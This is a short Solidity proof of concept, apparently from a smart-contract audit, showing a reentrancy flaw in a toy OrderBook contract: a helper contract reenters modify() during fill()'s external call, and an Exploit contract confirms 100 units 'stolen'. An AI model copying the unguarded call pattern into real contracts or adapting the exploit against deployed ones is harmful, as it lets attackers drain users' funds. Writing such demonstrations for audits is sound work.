// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract OrderBook { uint256 public orderAmount=100; uint256 public stolen; function fill(address target) external { (bool ok,)=target.call(abi.encodeWithSignature("attack()")); require(ok,"target"); orderAmount=0; } function modify() external { stolen+=orderAmount; orderAmount=0; } }
contract ReenterTarget { OrderBook public book; constructor(OrderBook b){book=b;} function attack() external { book.modify(); } }
contract Exploit { bool public harmed; event Proof(uint256 stolen);
    function run() external { OrderBook book=new OrderBook(); ReenterTarget target=new ReenterTarget(book);
        // @> fillOrder() and modifyOrder() lack nonReentrant protection
        book.fill(address(target)); harmed=book.stolen()==100; emit Proof(book.stolen()); require(harmed,"reentrancy blocked"); }
}
